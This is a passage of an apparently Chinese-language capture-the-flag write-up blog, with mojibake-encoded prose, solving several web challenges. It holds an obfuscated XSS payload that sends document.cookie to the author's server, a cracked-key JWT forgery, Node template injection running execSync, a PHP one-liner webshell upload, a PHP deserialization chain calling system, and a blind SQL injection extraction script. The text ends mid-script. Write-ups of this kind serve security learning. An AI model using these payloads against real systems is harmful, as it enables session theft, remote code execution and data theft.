![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+[+[]]+[+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()+[])[!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[+!+[]]]+document.cookie)&gt;</span><br></pre></td></tr></table></figure><p>vpsé‡Œæ­webæœåŠ¡å™¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><p>é¡µé¢é‡Œç‚¹å‡»å‘é€ï¼Œç„¶åæäº¤ç®¡ç†å‘˜è®¿é—®ï¼Œvpsæ¥æ”¶åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">43.248.77.192 - - [25/Oct/2025 02:16:52] &quot;GET /?c=FLAG=SYC&#123;019a176810c37afaa5f038490030b8d7&#125; HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Expression"><a href="#Expression" class="headerlink" title="Expression"></a>Expression</h3><blockquote><p>è¿™ä¸ªç¨‹åºå‘˜å·æ‡’ç›´æ¥å¤åˆ¶ç²˜è´´ç½‘ä¸Šçš„ä»£ç è¿ JWT å¯†é’¥éƒ½ä¸æ”¹..ï¼Ÿ</p></blockquote><p>jwt.ioè§£æjwtï¼Œå°è¯•çˆ†ç ´jwt_keyï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gojwtcrack -t token.txt -d rockyou.txt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°jwt_keyæ˜¯ <code>secret</code>ã€‚</p><p>ä¼ªé€ user=adminçš„jwtï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFhYUBxcS5jb20iLCJ1c2VybmFtZSI6InVzZXJfNzQwYzQxMWM1NzM5IiwiaWF0IjoxNzYxMzI1OTYzLCJleHAiOjE3NjE5MzA3NjN9.PRmjv1GUcvmnqzz7lG54PF4Gr0MD65ut10skltmIGBI</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹cookieï¼Œæ˜¾ç¤ºâ€adminâ€ï¼Œå°è¯• â€œ6â€œ ä¹Ÿæ— æ•ˆæœã€‚</p><p>é¢˜ç›®æ˜¯Expressionï¼ŒçŒœæµ‹æ˜¯node.jsï¼Œå°è¯•node.jsçš„SSTIï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aaa@qq.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;) %&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1761325963</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1761930763</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å‘ç°å¯ä»¥å›æ˜¾idï¼Œæ”¹ä¸ºï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aaa@qq.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;) %&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1761325963</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1761930763</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG=SYC&#123;019a1734deb97ab9b2e9d6ef9fb520ed&#125;</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="one-last-image"><a href="#one-last-image" class="headerlink" title="one_last_image"></a>one_last_image</h3><blockquote><p>ç¬¬ä¸€æ¬¡æ¥å—æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„æ„Ÿè§‰ï¼Œå› ä¸ºç‹¬å±äºæˆ‘çš„wafï¼Œæˆ‘æ—©å·²éƒ¨ç½²ã€‚å†è§äº†ï¼Œæ‰€æœ‰çš„ä¸€å¥è¯æœ¨é©¬ã€‚</p><p>Can you give me one last shell?</p></blockquote><p>ä¸Šä¼ 1.phpçš„æ—¶å€™bpæŠ“åŒ…ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>019a16eb-fcca-708b-b0fa-68267c4d4816.geek.ctfplus.cn</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryzZMcE6nu3YZMaAv4</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;image&quot;; filename=&quot;1.php&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/octet-stream</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">123</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryzZMcE6nu3YZMaAv4</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;colorsize&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">20</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryzZMcE6nu3YZMaAv4</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;mode&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">light</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryzZMcE6nu3YZMaAv4--</span></span></span><br></pre></td></tr></table></figure><p>é‡æ”¾å‘ç°å“åº”æ˜¯ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">500</span> Internal Server Error</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 24 Oct 2025 15:56:49 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>883</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/8.2.29</span><br><span class="line"></span><br><span class="line"><span class="language-maxima">Error during <span class="built_in">image</span> processing: cannot identify <span class="built_in">image</span> file &#x27;/<span class="built_in">var</span>/www/html/uploads/1f5ad475-36eb-<span class="number">4b96</span>-baa3-2aa532a7f033.php&#x27;</span></span><br><span class="line"><span class="language-maxima">Traceback (most recent call <span class="built_in">last</span>):</span></span><br><span class="line"><span class="language-maxima">  File <span class="string">&quot;/var/www/html/one_last_image.py&quot;</span>, line <span class="number">140</span>, <span class="keyword">in</span> main</span></span><br><span class="line"><span class="language-maxima">    draw_colorful(color_size=color_size,input_path=input_path,output_path=output_path,mode=dark_mode)</span></span><br><span class="line"><span class="language-maxima">    ~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span></span><br><span class="line"><span class="language-maxima">  File <span class="string">&quot;/var/www/html/one_last_image.py&quot;</span>, line <span class="number">98</span>, <span class="keyword">in</span> draw_colorful</span></span><br><span class="line"><span class="language-maxima">    draw_list = get_image_line(color_size, input_path)</span></span><br><span class="line"><span class="language-maxima">  File <span class="string">&quot;/var/www/html/one_last_image.py&quot;</span>, line <span class="number">61</span>, <span class="keyword">in</span> get_image_line</span></span><br><span class="line"><span class="language-maxima">    im_raw = Image.open(file)</span></span><br><span class="line"><span class="language-maxima">  File <span class="string">&quot;/usr/local/lib/python3.13/dist-packages/PIL/Image.py&quot;</span>, line <span class="number">3560</span>, <span class="keyword">in</span> open</span></span><br><span class="line"><span class="language-maxima">    raise UnidentifiedImageError(msg)</span></span><br><span class="line"><span class="language-maxima">PIL.UnidentifiedImageError: cannot identify <span class="built_in">image</span> file &#x27;/<span class="built_in">var</span>/www/html/uploads/1f5ad475-36eb-<span class="number">4b96</span>-baa3-2aa532a7f033.php&#x27;</span></span><br></pre></td></tr></table></figure><p>è™½ç„¶æŠ¥è§£æå›¾ç‰‡é”™è¯¯ï¼Œä½†phpæ–‡ä»¶å·²ç»è¢«é‡å‘½åå†™å…¥äº†uploadsé‡Œï¼Œä¿®æ”¹phpå†…å®¹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`$_GET[x]`;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è·¯å¾„ï¼Œè®¿é—®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uploads/26ac570a-4d79-4d78-93cd-003e8bb70df2.php?x=env</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG=SYC&#123;0_M3_de_t0u_019a16ebfcae7251bb6d929cc0000664&#125;</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="popself"><a href="#popself" class="headerlink" title="popself"></a>popself</h3><blockquote><p>æœ‰åŒå­¦è·Ÿæˆ‘è¯´ä»–åªä¼šåšä¸€ä¸ªç±»çš„phpååºåˆ—åŒ–é¢˜ï¼Œé‚£æ¥è¯•è¯•çœ‹</p></blockquote><p>æ„é€ ååºåˆ—åŒ–é“¾ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">All_in_one</span>: <span class="comment"># __invoke</span></span><br><span class="line">    public_SamsÄra=<span class="string">&#x27;system&#x27;</span></span><br><span class="line">    public_ivory=<span class="string">&#x27;env&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">All_in_one</span>: <span class="comment"># __tostring</span></span><br><span class="line">    public__4ak5ra=All_in_one()</span><br><span class="line"></span><br><span class="line">x = All_in_one()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">All_in_one</span>: <span class="comment"># __call</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">y = All_in_one()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">All_in_one</span>: <span class="comment"># __set</span></span><br><span class="line">    public_komiko=y</span><br><span class="line">    public_L=<span class="string">&#x27;9e9&#x27;</span> <span class="comment"># ç»•è¿‡ strlen($args[0])&lt;4 &amp;&amp; ($args[0]+1)&gt;10000</span></span><br><span class="line">    public_sleep3r=x</span><br><span class="line">    public_Fox=<span class="string">&#x27;summer::find_myself&#x27;</span> <span class="comment"># é™æ€è°ƒç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">All_in_one</span>: <span class="comment"># __destruct</span></span><br><span class="line">    public_KiraKiraAyu=<span class="string">&#x27;0e1138100474&#x27;</span> <span class="comment"># ç»•è¿‡ md5(md5($this-&gt;KiraKiraAyu))==md5($this-&gt;K4per)</span></span><br><span class="line">    public_K4per=<span class="string">&#x27;0e215962017&#x27;</span></span><br><span class="line">    public_QYQS=All_in_one()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(All_in_one())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A10%3A&quot;All_in_one&quot;%3A3%3A%7Bs%3A5%3A&quot;K4per&quot;%3Bs%3A11%3A&quot;0e215962017&quot;%3Bs%3A11%3A&quot;KiraKiraAyu&quot;%3Bs%3A12%3A&quot;0e1138100474&quot;%3Bs%3A4%3A&quot;QYQS&quot;%3BO%3A10%3A&quot;All_in_one&quot;%3A4%3A%7Bs%3A3%3A&quot;Fox&quot;%3Bs%3A19%3A&quot;summer%3A%3Afind_myself&quot;%3Bs%3A1%3A&quot;L&quot;%3Bs%3A3%3A&quot;9e9&quot;%3Bs%3A6%3A&quot;komiko&quot;%3BO%3A10%3A&quot;All_in_one&quot;%3A0%3A%7B%7Ds%3A7%3A&quot;sleep3r&quot;%3BO%3A10%3A&quot;All_in_one&quot;%3A1%3A%7Bs%3A7%3A&quot;_4ak5ra&quot;%3BO%3A10%3A&quot;All_in_one&quot;%3A2%3A%7Bs%3A8%3A&quot;SamsÄra&quot;%3Bs%3A6%3A&quot;system&quot;%3Bs%3A5%3A&quot;ivory&quot;%3Bs%3A3%3A&quot;env&quot;%3B%7D%7D%7D%7D</span></span><br></pre></td></tr></table></figure><p>æœ€ååˆ©ç”¨phpç‰¹æ€§ï¼Œä¼ å‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?24[SYC.zip=O%3A10%3A&quot;All_in_one&quot;%3A3%3A%7Bs%3A5%3A&quot;K4per&quot;%3Bs%3A11%3A&quot;0e215962017&quot;%3Bs%3A11%3A&quot;KiraKiraAyu&quot;%3Bs%3A12%3A&quot;0e1138100474&quot;%3Bs%3A4%3A&quot;QYQS&quot;%3BO%3A10%3A&quot;All_in_one&quot;%3A4%3A%7Bs%3A3%3A&quot;Fox&quot;%3Bs%3A19%3A&quot;summer%3A%3Afind_myself&quot;%3Bs%3A1%3A&quot;L&quot;%3Bs%3A3%3A&quot;9e9&quot;%3Bs%3A6%3A&quot;komiko&quot;%3BO%3A10%3A&quot;All_in_one&quot;%3A0%3A%7B%7Ds%3A7%3A&quot;sleep3r&quot;%3BO%3A10%3A&quot;All_in_one&quot;%3A1%3A%7Bs%3A7%3A&quot;_4ak5ra&quot;%3BO%3A10%3A&quot;All_in_one&quot;%3A2%3A%7Bs%3A8%3A&quot;SamsÄra&quot;%3Bs%3A6%3A&quot;system&quot;%3Bs%3A5%3A&quot;ivory&quot;%3Bs%3A3%3A&quot;env&quot;%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG=SYC&#123;Round_And_r0und_019a1703475b76489d20173cb334e46b&#125;</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Sequal-No-Uta"><a href="#Sequal-No-Uta" class="headerlink" title="Sequal No Uta"></a>Sequal No Uta</h3><blockquote><p>SQLite Ma U</p></blockquote><p>æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;/**/or(1)or/**/&#x27;0 è¯¥ç”¨æˆ·å­˜åœ¨ä¸”æ´»è·ƒ</span><br><span class="line">0&#x27;/**/or(0)or/**/&#x27;0 æœªæ‰¾åˆ°ç”¨æˆ·æˆ–å·²åœç”¨</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢sqlè¯­å¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://019a3b43-d0ea-7442-80c5-20774493afec.geek.ctfplus.cn/check.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;iif(substr((select/**/hex(group_concat(sql))/**/from/**/sqlite_master),<span class="subst">&#123;i&#125;</span>,1)&gt;&quot;<span class="subst">&#123;<span class="built_in">chr</span>(mid)&#125;</span>&quot;,1,0)&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: <span class="string">f&quot;0&#x27;/**/or(<span class="subst">&#123;payload&#125;</span>)or/**/&#x27;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url,params=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;è¯¥ç”¨æˆ·å­˜åœ¨ä¸”æ´»è·ƒ&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">435245415445205441424C4520757365727320280A2020202020202020696420494E5445474552205052494D415259204B4559204155544F494E4352454D454E542C0A2020202020202020757365726E616D65205445585420554E49515545204E4F54204E554C4C2C0A202020202020202070617373776F72642054455854204E4F54204E554C4C2C0A202020202020202069735F61637469766520494E5445474552204E4F54204E554C4C2044454641554C5420312C0A202020202020202073656372657420544558540A20202020292C435245415445205441424C452073716C6974655F73657175656E6365286E616D652C73657129</span><br></pre></td></tr></table></figure><p>16è¿›åˆ¶è½¬å­—ç¬¦ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> users (</span><br><span class="line">        id <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY AUTOINCREMENT,</span><br><span class="line">        username TEXT <span class="keyword">UNIQUE</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">        password TEXT <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">        is_active <span class="type">INTEGER</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">1</span>,</span><br><span class="line">        secret TEXT</span><br><span class="line">    ),<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sqlite_sequence(name,seq)</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢secretï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://019a3b43-d0ea-7442-80c5-20774493afec.geek.ctfplus.cn/check.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;iif(substr((select/**/group_concat(secret)/**/from/**/users),<span class="subst">&#123;i&#125;</span>,1)&gt;&quot;<span class="subst">&#123;<span class="built_in">chr</span>(mid)&#125;</span>&quot;,1,0)&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: <span class="string">f&quot;0&#x27;/**/or(<span class="subst">&#123;payload&#125;</span>)or/**/&#x27;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url,params=data)</span><br><span class="line">        <span class="keyword">if</span> <span 